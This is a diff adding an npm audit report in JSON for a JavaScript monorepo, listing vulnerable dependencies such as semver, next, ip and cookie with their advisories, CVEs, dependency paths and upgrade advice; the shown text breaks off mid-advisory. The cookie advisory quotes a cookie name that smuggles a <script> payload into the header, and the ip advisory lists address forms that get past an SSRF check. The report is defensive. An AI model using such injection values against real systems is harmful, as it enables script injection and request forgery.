@@ -1,0 +1,1051 @@
+{
+  "actions": [
+    {
+      "action": "review",
+      "module": "semver",
+      "resolves": [
+        {
+          "id": 1101088,
+          "path": "apps__mobile>expo>@expo/cli>@expo/image-utils>semver",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "next",
+      "resolves": [
+        {
+          "id": 1101438,
+          "path": "apps__admin>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1105461,
+          "path": "apps__admin>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1107226,
+          "path": "apps__admin>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1107512,
+          "path": "apps__admin>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1107513,
+          "path": "apps__admin>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1108291,
+          "path": "apps__admin>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1108953,
+          "path": "apps__admin>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1111391,
+          "path": "apps__admin>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1111461,
+          "path": "apps__admin>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "ip",
+      "resolves": [
+        {
+          "id": 1101851,
+          "path": "apps__mobile>react-native>@react-native-community/cli>@react-native-community/cli-doctor>ip",
+          "dev": false,
+          "bundled": false,
+          "optional": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "@coinbase/wallet-sdk",
+      "resolves": [
+        {
+          "id": 1102340,
+          "path": "apps__admin>@privy-io/react-auth>@coinbase/wallet-sdk",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "cookie",
+      "resolves": [
+        {
+          "id": 1103907,
+          "path": "apps__mobile>expo-router>@expo/server>@remix-run/node>@remix-run/server-runtime>cookie",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "web3-core-subscriptions",
+      "resolves": [
+        {
+          "id": 1108316,
+          "path": "apps__admin>@privy-io/react-auth>web3-core>web3-core-method>web3-core-subscriptions",
+          "dev": false,
+          "bundled": false,
+          "optional": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "send",
+      "resolves": [
+        {
+          "id": 1109556,
+          "path": "apps__mobile>expo>@expo/cli>send",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "nodemailer",
+      "resolves": [
+        {
+          "id": 1109804,
+          "path": "packages__core-services>nodemailer",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1111074,
+          "path": "packages__core-services>nodemailer",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1111548,
+          "path": "packages__core-services>nodemailer",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "glob",
+      "resolves": [
+        {
+          "id": 1109842,
+          "path": "packages__frames>eslint-config-next>@next/eslint-plugin-next>glob",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    }
+  ],
+  "advisories": {
+    "1101088": {
+      "findings": [
+        {
+          "version": "7.3.2",
+          "paths": [
+            "apps/mobile > expo@50.0.21 > @expo/cli@0.17.13 > @expo/image-utils@0.4.2 > semver@7.3.2",
+            "apps/mobile > expo@50.0.21 > @expo/cli@0.17.13 > @expo/prebuild-config@6.8.1 > @expo/image-utils@0.4.2 > semver@7.3.2",
+            "apps/mobile > expo-router@3.4.10 > expo@50.0.21 > @expo/cli@0.17.13 > @expo/image-utils@0.4.2 > semver@7.3.2",
+            "apps/mobile > expo-router@3.4.10 > expo@50.0.21 > @expo/cli@0.17.13 > @expo/prebuild-config@6.8.1 > @expo/image-utils@0.4.2 > semver@7.3.2",
+            "apps/mobile > expo-router@3.4.10 > expo-linking@8.0.11 > expo-constants@18.0.12 > expo@50.0.21 > @expo/cli@0.17.13 > @expo/image-utils@0.4.2 > semver@7.3.2",
+            "apps/mobile > expo-router@3.4.10 > expo-linking@8.0.11 > expo-constants@18.0.12 > expo@50.0.21 > @expo/cli@0.17.13 > @expo/prebuild-config@6.8.1 > @expo/image-utils@0.4.2 > semver@7.3.2",
+            "apps/mobile > expo-router@3.4.10 > expo-splash-screen@0.26.5 > @expo/prebuild-config@6.8.1 > @expo/image-utils@0.4.2 > semver@7.3.2",
+            "apps/mobile > expo-router@3.4.10 > expo-splash-screen@0.26.5 > expo@50.0.21 > @expo/cli@0.17.13 > @expo/image-utils@0.4.2 > semver@7.3.2",
+            "apps/mobile > expo-router@3.4.10 > expo-splash-screen@0.26.5 > expo@50.0.21 > @expo/cli@0.17.13 > @expo/prebuild-config@6.8.1 > @expo/image-utils@0.4.2 > semver@7.3.2"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2022-25883\n- https://github.com/npm/node-semver/pull/564\n- https://github.com/npm/node-semver/commit/717534ee353682f3bcf33e60a8af4292626d4441\n- https://security.snyk.io/vuln/SNYK-JS-SEMVER-3247795\n- https://github.com/npm/node-semver/blob/main/classes/range.js#L97-L104\n- https://github.com/npm/node-semver/blob/main/internal/re.js#L138\n- https://github.com/npm/node-semver/blob/main/internal/re.js#L160\n- https://github.com/npm/node-semver/pull/585\n- https://github.com/npm/node-semver/commit/928e56d21150da0413a3333a3148b20e741a920c\n- https://github.com/npm/node-semver/pull/593\n- https://github.com/npm/node-semver/commit/2f8fd41487acf380194579ecb6f8b1bbfe116be0\n- https://github.com/npm/node-semver/blob/main/classes/range.js%23L97-L104\n- https://github.com/npm/node-semver/blob/main/internal/re.js%23L138\n- https://github.com/npm/node-semver/blob/main/internal/re.js%23L160\n- https://security.netapp.com/advisory/ntap-20241025-0004\n- https://github.com/advisories/GHSA-c2qf-rxjj-qqgw",
+      "created": "2023-06-21T06:30:28.000Z",
+      "id": 1101088,
+      "npm_advisory_id": null,
+      "overview": "Versions of the package semver before 7.5.2 on the 7.x branch, before 6.3.1 on the 6.x branch, and all other versions before 5.7.2 are vulnerable to Regular Expression Denial of Service (ReDoS) via the function new Range, when untrusted user data is provided as a range.",
+      "reported_by": null,
+      "title": "semver vulnerable to Regular Expression Denial of Service",
+      "metadata": null,
+      "cves": [
+        "CVE-2022-25883"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "semver",
+      "vulnerable_versions": ">=7.0.0 <7.5.2",
+      "github_advisory_id": "GHSA-c2qf-rxjj-qqgw",
+      "recommendation": "Upgrade to version 7.5.2 or later",
+      "patched_versions": ">=7.5.2",
+      "updated": "2024-12-06T20:34:33.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-1333"
+      ],
+      "url": "https://github.com/advisories/GHSA-c2qf-rxjj-qqgw"
+    },
+    "1101438": {
+      "findings": [
+        {
+          "version": "14.2.18",
+          "paths": [
+            "apps/admin > next@14.2.18",
+            "apps/web > next@14.2.18",
+            "packages/frames > frames.js@0.11.4 > next@14.2.18",
+            "packages/frames > next@14.2.18"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-7m27-7ghc-44w9\n- https://nvd.nist.gov/vuln/detail/CVE-2024-56332\n- https://github.com/advisories/GHSA-7m27-7ghc-44w9",
+      "created": "2025-01-03T20:19:29.000Z",
+      "id": 1101438,
+      "npm_advisory_id": null,
+      "overview": "### Impact\nA Denial of Service (DoS) attack allows attackers to construct requests that leaves requests to Server Actions hanging until the hosting provider cancels the function execution.\n\n_Note: Next.js server is idle during that time and only keeps the connection open. CPU and memory footprint are low during that time._\n\nDeployments without any protection against long running Server Action invocations are especially vulnerable. Hosting providers like Vercel or Netlify set a default maximum duration on function execution to reduce the risk of excessive billing.\n\nThis is the same issue as if the incoming HTTP request has an invalid `Content-Length` header or never closes. If the host has no other mitigations to those then this vulnerability is novel.\n\nThis vulnerability affects only Next.js deployments using Server Actions.\n\n### Patches\n\nThis vulnerability was resolved in Next.js 14.2.21, 15.1.2, and 13.5.8. We recommend that users upgrade to a safe version.\n\n### Workarounds\n\nThere are no official workarounds for this vulnerability.\n\n### Credits\n\nThanks to the PackDraw team for responsibly disclosing this vulnerability.",
+      "reported_by": null,
+      "title": "Next.js Allows a Denial of Service (DoS) with Server Actions",
+      "metadata": null,
+      "cves": [
+        "CVE-2024-56332"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "next",
+      "vulnerable_versions": ">=14.0.0 <14.2.21",
+      "github_advisory_id": "GHSA-7m27-7ghc-44w9",
+      "recommendation": "Upgrade to version 14.2.21 or later",
+      "patched_versions": ">=14.2.21",
+      "updated": "2025-01-07T16:24:09.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-770"
+      ],
+      "url": "https://github.com/advisories/GHSA-7m27-7ghc-44w9"
+    },
+    "1101851": {
+      "findings": [
+        {
+          "version": "1.1.9",
+          "paths": [
+            "apps/admin > @privy-io/wagmi-connector@0.1.13 > wagmi@2.19.5 > @wagmi/connectors@6.2.0 > porto@0.2.35 > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-doctor@12.1.1 > ip@1.1.9",
+            "apps/admin > @privy-io/wagmi-connector@0.1.13 > wagmi@2.19.5 > @wagmi/connectors@6.2.0 > porto@0.2.35 > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-hermes@12.1.1 > ip@1.1.9",
+            "apps/admin > wagmi@2.19.5 > @wagmi/connectors@6.2.0 > porto@0.2.35 > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-doctor@12.1.1 > ip@1.1.9",
+            "apps/admin > wagmi@2.19.5 > @wagmi/connectors@6.2.0 > porto@0.2.35 > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-hermes@12.1.1 > ip@1.1.9",
+            "apps/mobile > expo@50.0.21 > @expo/vector-icons@14.1.0 > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-doctor@12.1.1 > ip@1.1.9",
+            "apps/mobile > expo@50.0.21 > @expo/vector-icons@14.1.0 > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-hermes@12.1.1 > ip@1.1.9",
+            "apps/mobile > expo-router@3.4.10 > @expo/metro-runtime@3.1.3 > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-doctor@12.1.1 > ip@1.1.9",
+            "apps/mobile > expo-router@3.4.10 > @expo/metro-runtime@3.1.3 > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-hermes@12.1.1 > ip@1.1.9",
+            "apps/mobile > expo-router@3.4.10 > @react-navigation/bottom-tabs@6.5.20 > @react-navigation/elements@1.3.31 > @react-navigation/native@6.1.18 > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-doctor@12.1.1 > ip@1.1.9",
+            "apps/mobile > expo-router@3.4.10 > @react-navigation/bottom-tabs@6.5.20 > @react-navigation/elements@1.3.31 > @react-navigation/native@6.1.18 > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-hermes@12.1.1 > ip@1.1.9",
+            "apps/mobile > expo-router@3.4.10 > @react-navigation/bottom-tabs@6.5.20 > @react-navigation/elements@1.3.31 > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-doctor@12.1.1 > ip@1.1.9",
+            "apps/mobile > expo-router@3.4.10 > @react-navigation/bottom-tabs@6.5.20 > @react-navigation/elements@1.3.31 > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-hermes@12.1.1 > ip@1.1.9",
+            "apps/mobile > expo-router@3.4.10 > @react-navigation/bottom-tabs@6.5.20 > @react-navigation/elements@1.3.31 > react-native-safe-area-context@4.8.0 > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-doctor@12.1.1 > ip@1.1.9",
+            "apps/mobile > expo-router@3.4.10 > @react-navigation/bottom-tabs@6.5.20 > @react-navigation/elements@1.3.31 > react-native-safe-area-context@4.8.0 > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-hermes@12.1.1 > ip@1.1.9",
+            "apps/mobile > expo-router@3.4.10 > @react-navigation/bottom-tabs@6.5.20 > @react-navigation/native@6.1.18 > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-doctor@12.1.1 > ip@1.1.9",
+            "apps/mobile > expo-router@3.4.10 > @react-navigation/bottom-tabs@6.5.20 > @react-navigation/native@6.1.18 > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-hermes@12.1.1 > ip@1.1.9",
+            "apps/mobile > expo-router@3.4.10 > @react-navigation/bottom-tabs@6.5.20 > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-doctor@12.1.1 > ip@1.1.9",
+            "apps/mobile > expo-router@3.4.10 > @react-navigation/bottom-tabs@6.5.20 > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-hermes@12.1.1 > ip@1.1.9",
+            "apps/mobile > expo-router@3.4.10 > @react-navigation/bottom-tabs@6.5.20 > react-native-safe-area-context@4.8.0 > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-doctor@12.1.1 > ip@1.1.9",
+            "apps/mobile > expo-router@3.4.10 > @react-navigation/bottom-tabs@6.5.20 > react-native-safe-area-context@4.8.0 > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-hermes@12.1.1 > ip@1.1.9",
+            "apps/mobile > expo-router@3.4.10 > @react-navigation/bottom-tabs@6.5.20 > react-native-screens@3.29.0 > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-doctor@12.1.1 > ip@1.1.9",
+            "apps/mobile > expo-router@3.4.10 > @react-navigation/bottom-tabs@6.5.20 > react-native-screens@3.29.0 > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-hermes@12.1.1 > ip@1.1.9",
+            "apps/mobile > expo-router@3.4.10 > @react-navigation/native@6.1.18 > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-doctor@12.1.1 > ip@1.1.9",
+            "apps/mobile > expo-router@3.4.10 > @react-navigation/native@6.1.18 > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-hermes@12.1.1 > ip@1.1.9",
+            "apps/mobile > expo-router@3.4.10 > @react-navigation/native-stack@6.9.26 > @react-navigation/elements@1.3.31 > @react-navigation/native@6.1.18 > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-doctor@12.1.1 > ip@1.1.9",
+            "apps/mobile > expo-router@3.4.10 > @react-navigation/native-stack@6.9.26 > @react-navigation/elements@1.3.31 > @react-navigation/native@6.1.18 > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-hermes@12.1.1 > ip@1.1.9",
+            "apps/mobile > expo-router@3.4.10 > @react-navigation/native-stack@6.9.26 > @react-navigation/elements@1.3.31 > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-doctor@12.1.1 > ip@1.1.9",
+            "apps/mobile > expo-router@3.4.10 > @react-navigation/native-stack@6.9.26 > @react-navigation/elements@1.3.31 > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-hermes@12.1.1 > ip@1.1.9",
+            "apps/mobile > expo-router@3.4.10 > @react-navigation/native-stack@6.9.26 > @react-navigation/elements@1.3.31 > react-native-safe-area-context@4.8.0 > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-doctor@12.1.1 > ip@1.1.9",
+            "apps/mobile > expo-router@3.4.10 > @react-navigation/native-stack@6.9.26 > @react-navigation/elements@1.3.31 > react-native-safe-area-context@4.8.0 > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-hermes@12.1.1 > ip@1.1.9",
+            "apps/mobile > expo-router@3.4.10 > @react-navigation/native-stack@6.9.26 > @react-navigation/native@6.1.18 > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-doctor@12.1.1 > ip@1.1.9",
+            "apps/mobile > expo-router@3.4.10 > @react-navigation/native-stack@6.9.26 > @react-navigation/native@6.1.18 > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-hermes@12.1.1 > ip@1.1.9",
+            "apps/mobile > expo-router@3.4.10 > @react-navigation/native-stack@6.9.26 > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-doctor@12.1.1 > ip@1.1.9",
+            "apps/mobile > expo-router@3.4.10 > @react-navigation/native-stack@6.9.26 > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-hermes@12.1.1 > ip@1.1.9",
+            "apps/mobile > expo-router@3.4.10 > @react-navigation/native-stack@6.9.26 > react-native-safe-area-context@4.8.0 > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-doctor@12.1.1 > ip@1.1.9",
+            "apps/mobile > expo-router@3.4.10 > @react-navigation/native-stack@6.9.26 > react-native-safe-area-context@4.8.0 > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-hermes@12.1.1 > ip@1.1.9",
+            "apps/mobile > expo-router@3.4.10 > @react-navigation/native-stack@6.9.26 > react-native-screens@3.29.0 > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-doctor@12.1.1 > ip@1.1.9",
+            "apps/mobile > expo-router@3.4.10 > @react-navigation/native-stack@6.9.26 > react-native-screens@3.29.0 > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-hermes@12.1.1 > ip@1.1.9",
+            "apps/mobile > expo-router@3.4.10 > expo@50.0.21 > @expo/vector-icons@14.1.0 > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-doctor@12.1.1 > ip@1.1.9",
+            "apps/mobile > expo-router@3.4.10 > expo@50.0.21 > @expo/vector-icons@14.1.0 > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-hermes@12.1.1 > ip@1.1.9",
+            "apps/mobile > expo-router@3.4.10 > expo-linking@8.0.11 > expo-constants@18.0.12 > expo@50.0.21 > @expo/vector-icons@14.1.0 > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-doctor@12.1.1 > ip@1.1.9",
+            "apps/mobile > expo-router@3.4.10 > expo-linking@8.0.11 > expo-constants@18.0.12 > expo@50.0.21 > @expo/vector-icons@14.1.0 > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-hermes@12.1.1 > ip@1.1.9",
+            "apps/mobile > expo-router@3.4.10 > expo-linking@8.0.11 > expo-constants@18.0.12 > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-doctor@12.1.1 > ip@1.1.9",
+            "apps/mobile > expo-router@3.4.10 > expo-linking@8.0.11 > expo-constants@18.0.12 > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-hermes@12.1.1 > ip@1.1.9",
+            "apps/mobile > expo-router@3.4.10 > expo-linking@8.0.11 > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-doctor@12.1.1 > ip@1.1.9",
+            "apps/mobile > expo-router@3.4.10 > expo-linking@8.0.11 > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-hermes@12.1.1 > ip@1.1.9",
+            "apps/mobile > expo-router@3.4.10 > expo-splash-screen@0.26.5 > expo@50.0.21 > @expo/vector-icons@14.1.0 > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-doctor@12.1.1 > ip@1.1.9",
+            "apps/mobile > expo-router@3.4.10 > expo-splash-screen@0.26.5 > expo@50.0.21 > @expo/vector-icons@14.1.0 > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-hermes@12.1.1 > ip@1.1.9",
+            "apps/mobile > expo-router@3.4.10 > expo-status-bar@3.0.9 > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-doctor@12.1.1 > ip@1.1.9",
+            "apps/mobile > expo-router@3.4.10 > expo-status-bar@3.0.9 > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-hermes@12.1.1 > ip@1.1.9",
+            "apps/mobile > expo-router@3.4.10 > expo-status-bar@3.0.9 > react-native-is-edge-to-edge@1.2.1 > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-doctor@12.1.1 > ip@1.1.9",
+            "apps/mobile > expo-router@3.4.10 > expo-status-bar@3.0.9 > react-native-is-edge-to-edge@1.2.1 > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-hermes@12.1.1 > ip@1.1.9",
+            "apps/mobile > expo-router@3.4.10 > react-native-safe-area-context@4.8.0 > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-doctor@12.1.1 > ip@1.1.9",
+            "apps/mobile > expo-router@3.4.10 > react-native-safe-area-context@4.8.0 > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-hermes@12.1.1 > ip@1.1.9",
+            "apps/mobile > expo-router@3.4.10 > react-native-screens@3.29.0 > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-doctor@12.1.1 > ip@1.1.9",
+            "apps/mobile > expo-router@3.4.10 > react-native-screens@3.29.0 > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-hermes@12.1.1 > ip@1.1.9",
+            "apps/mobile > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-doctor@12.1.1 > ip@1.1.9",
+            "apps/mobile > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-hermes@12.1.1 > ip@1.1.9",
+            "apps/mobile > react-native-safe-area-context@4.8.0 > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-doctor@12.1.1 > ip@1.1.9",
+            "apps/mobile > react-native-safe-area-context@4.8.0 > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-hermes@12.1.1 > ip@1.1.9",
+            "apps/mobile > react-native-screens@3.29.0 > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-doctor@12.1.1 > ip@1.1.9",
+            "apps/mobile > react-native-screens@3.29.0 > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-hermes@12.1.1 > ip@1.1.9",
+            "packages/frames > @coinbase/onchainkit@0.17.11 > wagmi@2.19.5 > @wagmi/connectors@6.2.0 > porto@0.2.35 > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-doctor@12.1.1 > ip@1.1.9",
+            "packages/frames > @coinbase/onchainkit@0.17.11 > wagmi@2.19.5 > @wagmi/connectors@6.2.0 > porto@0.2.35 > react-native@0.73.0 > @react-native-community/cli@12.1.1 > @react-native-community/cli-hermes@12.1.1 > ip@1.1.9"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2024-29415\n- https://github.com/indutny/node-ip/issues/150\n- https://github.com/indutny/node-ip/pull/143\n- https://github.com/indutny/node-ip/pull/144\n- https://security.netapp.com/advisory/ntap-20250117-0010\n- https://github.com/advisories/GHSA-2p57-rm9w-gvfp",
+      "created": "2024-06-02T22:29:29.000Z",
+      "id": 1101851,
+      "npm_advisory_id": null,
+      "overview": "The ip package through 2.0.1 for Node.js might allow SSRF because some IP addresses (such as 127.1, 01200034567, 012.1.2.3, 000:0:0000::01, and ::fFFf:127.0.0.1) are improperly categorized as globally routable via isPublic. NOTE: this issue exists because of an incomplete fix for CVE-2023-42282.",
+      "reported_by": null,
+      "title": "ip SSRF improper categorization in isPublic",
+      "metadata": null,
+      "cves": [
+        "CVE-2024-29415"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "ip",
+      "vulnerable_versions": "<=2.0.1",
+      "github_advisory_id": "GHSA-2p57-rm9w-gvfp",
+      "recommendation": "None",
+      "patched_versions": "<0.0.0",
+      "updated": "2025-01-17T21:31:39.000Z",
+      "cvss": {
+        "score": 8.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "cwe": [
+        "CWE-918"
+      ],
+      "url": "https://github.com/advisories/GHSA-2p57-rm9w-gvfp"
+    },
+    "1102340": {
+      "findings": [
+        {
+          "version": "4.0.3",
+          "paths": [
+            "apps/admin > @privy-io/react-auth@1.99.1 > @coinbase/wallet-sdk@4.0.3",
+            "apps/admin > @privy-io/wagmi-connector@0.1.13 > @privy-io/react-auth@1.99.1 > @coinbase/wallet-sdk@4.0.3"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/coinbase/coinbase-wallet-sdk/security/advisories/GHSA-8rgj-285w-qcq4\n- https://github.com/advisories/GHSA-8rgj-285w-qcq4",
+      "created": "2025-02-10T17:59:09.000Z",
+      "id": 1102340,
+      "npm_advisory_id": null,
+      "overview": "### Impact\nThere is a security vulnerability in outdated versions of Coinbase Wallet SDK. This does not directly affect users' keys, smart contracts, or funds.\n\n### Patches\nPlease update to version >= 4.3.0.",
+      "reported_by": null,
+      "title": "Unknown vulnerability in Coinbase Wallet SDK",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "high",
+      "module_name": "@coinbase/wallet-sdk",
+      "vulnerable_versions": ">=4.0 <4.3.0",
+      "github_advisory_id": "GHSA-8rgj-285w-qcq4",
+      "recommendation": "Upgrade to version 4.3.0 or later",
+      "patched_versions": ">=4.3.0",
+      "updated": "2025-02-10T17:59:10.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [],
+      "url": "https://github.com/advisories/GHSA-8rgj-285w-qcq4"
+    },
+    "1103907": {
+      "findings": [
+        {
+          "version": "0.4.2",
+          "paths": [
+            "apps/mobile > expo-router@3.4.10 > @expo/server@0.3.1 > @remix-run/node@1.19.3 > @remix-run/server-runtime@1.19.3 > cookie@0.4.2"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/jshttp/cookie/security/advisories/GHSA-pxg6-pf52-xh8x\n- https://github.com/jshttp/cookie/pull/167\n- https://github.com/jshttp/cookie/commit/e10042845354fea83bd8f34af72475eed1dadf5c\n- https://github.com/advisories/GHSA-pxg6-pf52-xh8x",
+      "created": "2024-10-04T20:31:00.000Z",
+      "id": 1103907,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nThe cookie name could be used to set other fields of the cookie, resulting in an unexpected cookie value. For example, `serialize(\"userName=<script>alert('XSS3')</script>; Max-Age=2592000; a\", value)` would result in `\"userName=<script>alert('XSS3')</script>; Max-Age=2592000; a=test\"`, setting `userName` cookie to `<script>` and ignoring `value`.\n\nA similar escape can be used for `path` and `domain`, which could be abused to alter other fields of the cookie.\n\n### Patches\n\nUpgrade to 0.7.0, which updates the validation for `name`, `path`, and `domain`.\n\n### Workarounds\n\nAvoid passing untrusted or arbitrary values for these fields, ensure they are set by the application instead of user input.\n\n### References\n\n* https://github.com/jshttp/cookie/pull/167",
+      "reported_by": null,
+      "title": "cookie accepts cookie name, path, and domain with out of bounds characters",
+      "metadata": null,
+      "cves": [
+        "CVE-2024-47764"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "cookie",
+      "vulnerable_versions": "<0.7.0",
+      "github_advisory_id": "GHSA-pxg6-pf52-xh8x",
+      "recommendation": "Upgrade to version 0.7.0 or later",
+      "patched_versions": ">=0.7.0",
+      "updated": "2025-04-15T13:56:44.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-74"
+      ],
+      "url": "https://github.com/advisories/GHSA-pxg6-pf52-xh8x"
+    },
+    "1105461": {
+      "findings": [
+        {
+          "version": "14.2.18",
+          "paths": [
+            "apps/admin > next@14.2.18",
+            "apps/web > next@14.2.18",
+            "packages/frames > frames.js@0.11.4 > next@14.2.18",
+            "packages/frames > next@14.2.18"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-3h52-269p-cp9r\n- https://vercel.com/changelog/cve-2025-48068\n- https://nvd.nist.gov/vuln/detail/CVE-2025-48068\n- https://github.com/advisories/GHSA-3h52-269p-cp9r",
+      "created": "2025-05-28T21:52:13.000Z",
+      "id": 1105461,
+      "npm_advisory_id": null,
